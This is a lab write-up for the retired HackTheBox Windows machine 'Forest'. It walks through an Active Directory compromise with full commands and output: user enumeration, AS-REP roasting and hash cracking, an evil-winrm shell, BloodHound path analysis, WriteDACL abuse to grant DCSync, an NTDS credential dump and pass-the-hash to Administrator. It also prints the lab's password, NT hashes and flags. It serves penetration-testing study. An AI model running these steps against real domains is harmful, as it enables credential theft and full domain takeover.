# Forest — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Active Directory | Yes |
| IP | 10.129.2.88 |
| Domain | htb.local |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/forest](https://jostif.pages.dev/writeups/forest) |

**Techniques:** Anonymous LDAP user enum → AS-REP Roasting (svc-alfresco) → WinRM → BloodHound → Account Operators → Exchange Windows Permissions → WriteDACL → DCSync → Administrator PTH

---

---

## Overview

Forest is an Easy-rated Windows Active Directory machine that covers two fundamental AD attack techniques back to back: **AS-REP Roasting** to get an initial foothold, and **DCSync via WriteDACL abuse** to escalate to Domain Admin. What makes it interesting is the path to DCSync — it goes through Microsoft Exchange's leftover security groups, which grant dangerously high privileges on the domain object.

One extra twist: there's a scheduled task that keeps cleaning up group memberships, so you have to race against the clock on the privilege escalation step. It's a great lesson in how real-world attack windows can be tight.

The attack chain looks like this:

```
Anonymous LDAP/SMB → user enumeration → AS-REP Roast svc-alfresco
→ crack hash → WinRM shell → BloodHound → Account Operators
→ add self to Exchange Windows Permissions → WriteDACL on domain
→ DCSync → Administrator NT hash → PTH → root
```

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.2.88
```

The usual AD fingerprint comes back. Key ports:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | DC confirmed |
| 88 | Kerberos | AD environment |
| 389/636 | LDAP/LDAPS | Domain: `htb.local` |
| 445 | SMB | Windows Server 2016 |
| 5985 | WinRM | Remote management available |
| 9389 | AD Web Services | .NET framing |

Good news — port 5985 is open, so evil-winrm will work once we have credentials. Domain is `htb.local`, hostname is `FOREST`.

Set up variables and `/etc/hosts`:

```bash
export IP=10.129.2.88
export DOMAIN=htb.local
echo "10.129.2.88  htb.local FOREST.htb.local" | sudo tee -a /etc/hosts
```

### SMB and User Enumeration

Null session auth works, but share enumeration is denied. However, user enumeration via RID cycling works with an empty username:

```bash
nxc smb $IP -u '' -p '' --users
```

This dumps a surprisingly large user list — 31 accounts. Among the noise of Exchange health mailboxes and system accounts, a few stand out as real people:

```
Administrator
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

The `svc-` prefix on `svc-alfresco` is a dead giveaway — service accounts are high-value targets because they often have weaker passwords and sometimes have Kerberos pre-authentication disabled.

Save the interesting ones to a file:

```bash
cat > users.txt << EOF
sebastien
lucinda
svc-alfresco
andy
mark
santi
EOF
```

---

## Initial Foothold

### AS-REP Roasting

Kerberos pre-authentication is a security feature that forces users to prove they know their password before the DC will issue them a ticket. If it's disabled on an account, anyone can request an encrypted ticket for that user without knowing their password — and then crack it offline. This attack is called **AS-REP Roasting**.

Check all our enumerated users:

```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -no-pass -usersfile users.txt
```

Only one account bites:

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:962e26d7618bb19183b48f50486002af$7b1cc078...
```

`svc-alfresco` has pre-auth disabled. The AS-REP hash is returned — this is encrypted with the account's password hash, so we can crack it offline.

Note the hash mode difference from Kerberoasting:
- AS-REP hashes: `$krb5asrep$` → hashcat mode **18200**
- TGS/Kerberoast hashes: `$krb5tgs$` → hashcat mode **13100**

A common beginner mistake is using `-m 13100` here (Kerberoasting mode) — that gives a "Signature unmatched" error. Always check the hash prefix.

### Cracking the Hash

```bash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked in **2 seconds**:

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...:s3rvice
```

Credentials: `svc-alfresco:s3rvice`

### WinRM Shell

```bash
nxc winrm $IP -u 'svc-alfresco' -p 's3rvice'
# [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)

evil-winrm -i $IP -u 'svc-alfresco' -p 's3rvice'
```

Grab the user flag:

```powershell
cat C:\Users\svc-alfresco\Desktop\user.txt
# c3617bf3ae7d8c1a7f55785ac983d96f
```

---

## Privilege Escalation

### BloodHound Enumeration

We're in but we need to understand the AD structure to find our path to Domain Admin. BloodHound is the tool for this — it maps out all the relationships between users, groups, and permissions in the domain and highlights attack paths visually.

```bash
bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d $DOMAIN \
  -ns $IP -c All --zip
```

This collects everything — users, groups, GPOs, OUs, sessions, ACLs — and bundles it into a zip for import into the BloodHound GUI.

### Reading the Attack Path

After importing into BloodHound and searching for the shortest path to Domain Admin from `svc-alfresco`, the chain becomes clear:

```
svc-alfresco
  → member of: Service Accounts
    → member of: Privileged IT Accounts
      → member of: Account Operators (built-in)
        → can add members to: Exchange Windows Permissions
          → has WriteDACL on: htb.local (domain root)
            → can grant: DCSync rights
              → dump all hashes → Domain Admin
```

Let's break down the key links:

**Account Operators** is a built-in Windows group that can create and modify most user and group accounts. Critically, it can add members to non-protected groups — including Exchange security groups.

**Exchange Windows Permissions** is a group Microsoft Exchange creates during installation. It needs broad access to manage Active Directory objects, so Microsoft gave it `WriteDACL` on the entire domain object. `WriteDACL` means it can modify the Access Control List of the domain — including granting itself (or anyone) DCSync rights.

**DCSync** is a technique that mimics how Domain Controllers replicate data between each other. If you have the right permissions (`DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`), you can ask the DC to "sync" you any account's credentials — including their NT hash. This is effectively a full domain credential dump without touching LSASS or any files on disk.

### The Attack

**Step 1 — Add svc-alfresco to Exchange Windows Permissions**

Because svc-alfresco is in Account Operators, we can add ourselves to Exchange Windows Permissions:

```powershell
# From evil-winrm
net group "Exchange Windows Permissions" svc-alfresco /add /domain
```

There's a catch here — **a scheduled task on this box resets group memberships every few minutes**. This is a Forest-specific quirk (and honestly a realistic defensive control). If you wait too long between steps, your membership gets stripped and the DCSync write fails with `INSUFF_ACCESS_RIGHTS`.

The solution: chain the dacledit and secretsdump commands together with `&&` so they fire back-to-back immediately after adding the group membership.

**Step 2 — Grant DCSync and dump hashes in one shot**

From your evil-winrm shell, add the group. Then immediately in your Kali terminal:

```bash
dacledit.py -action 'write' -rights 'DCSync' \
  -principal 'svc-alfresco' \
  -target-dn 'DC=HTB,DC=LOCAL' \
  'htb.local'/'svc-alfresco':'s3rvice' \
  -dc-ip 10.129.2.88 && \
impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.129.2.88
```

The `&&` means secretsdump fires the instant dacledit succeeds — before the cleanup task runs.

Output:

```
[*] DACL modified successfully!
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
...
```

The full NTDS is ours. Administrator's NT hash: `32693b11e6aa90eb43d32c72a07ceea6`

### Shell as Administrator

Pass-the-Hash with evil-winrm:

```bash
evil-winrm -i 10.129.2.88 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
ce23b727cfeaa565bf537717dbb3f99a
```

---

## Flags

| Flag | Hash |
|------|------|
| User | `c3617bf3ae7d8c1a7f55785ac983d96f` |
| Root | `ce23b727cfeaa565bf537717dbb3f99a` |

---

## Full Attack Chain Summary

```
[1] Nmap → DC identified, domain: htb.local, WinRM open on 5985
        ↓
[2] SMB null auth → user enumeration via --users (31 accounts dumped)
        ↓
[3] Filtered to real accounts → users.txt
        ↓
[4] GetNPUsers → svc-alfresco has pre-auth disabled → AS-REP hash captured
        ↓
[5] hashcat -m 18200 → svc-alfresco:s3rvice (2 seconds)
        ↓
[6] WinRM as svc-alfresco → user flag
        ↓
[7] BloodHound → attack path found:
    svc-alfresco → Account Operators → Exchange Windows Permissions
    → WriteDACL on domain → DCSync
        ↓
[8] net group add → Exchange Windows Permissions membership
        ↓
[9] dacledit && secretsdump (chained to race cleanup task)
    → DCSync rights granted → full NTDS dump
        ↓
[10] Administrator NT hash → evil-winrm PTH → root flag
```

---

## Key Concepts

### AS-REP Roasting vs Kerberoasting

These two attacks are often confused. Here's the difference:

| | AS-REP Roasting | Kerberoasting |
|--|--|--|
| **Target** | Accounts with pre-auth disabled | Accounts with SPNs registered |
| **What you request** | AS-REP (TGT encrypted with user's key) | TGS (service ticket encrypted with service account's key) |
| **Who can do it** | Anyone (even unauthenticated) | Any authenticated domain user |
| **Hashcat mode** | 18200 | 13100 |
| **Hash prefix** | `$krb5asrep$` | `$krb5tgs$` |

Both attacks let you crack credentials offline without triggering account lockouts.

### Why Exchange Permissions Are Dangerous

When Microsoft Exchange is installed in an AD environment, it creates several security groups and grants them broad permissions on the domain. This was necessary for Exchange to manage mailboxes and accounts. The problem is that when Exchange is later removed or updated, these groups and their permissions often linger — and they're extremely powerful.

`Exchange Windows Permissions` with `WriteDACL` on the domain root is one of the most impactful misconfigurations in AD environments with Exchange history. It's been known since at least 2018 and is documented in the "PrivExchange" research.

### WriteDACL and DCSync

`WriteDACL` on an AD object means you can rewrite its Access Control List. On the domain root object (`DC=HTB,DC=LOCAL`), this means you can grant yourself (or any principal) any right — including `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, which together enable DCSync.

DCSync works by impersonating a Domain Controller's replication request. The DC responds by sending you the requested account's credentials as it would to a legitimate DC — including the NT hash and Kerberos keys.

### The Race Condition

Forest has a cleanup scheduled task that periodically resets the Exchange Windows Permissions group to its default state (empty or containing only legitimate members). This is actually a realistic defensive pattern — some organizations run scripts to detect and revert unauthorized group modifications.

The lesson: when you have a write primitive that gets cleaned up, chain your exploitation steps together. Use `&&` in bash to fire multiple commands sequentially without gaps, or use a loop to keep re-adding the membership while you work.

### BloodHound as a Thinking Tool

BloodHound doesn't just find attack paths — it helps you understand *why* they exist. Every edge in the graph represents a real Active Directory relationship: group membership, ACL rights, session data. When you see a path like `Account Operators → WriteDACL on domain`, you can look up exactly what those permissions mean and how to abuse them.

For OSCP/CPTS prep: always run BloodHound as one of your first steps after getting any AD credentials. Mark your owned nodes, use the pre-built queries (Shortest Path to Domain Admin, Find All Domain Admins, etc.), and let the graph tell you what to research next.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service enumeration |
| `netexec (nxc)` | SMB/WinRM auth and user enumeration |
| `impacket-GetNPUsers` | AS-REP Roasting — finding and requesting AS-REP hashes |
| `hashcat` | AS-REP hash cracking (-m 18200) |
| `evil-winrm` | WinRM shell and pass-the-hash |
| `bloodhound-python` | AD relationship mapping and attack path discovery |
| `dacledit.py` | Writing DCSync rights to domain DACL |
| `impacket-secretsdump` | DCSync — dumping NTDS credentials |
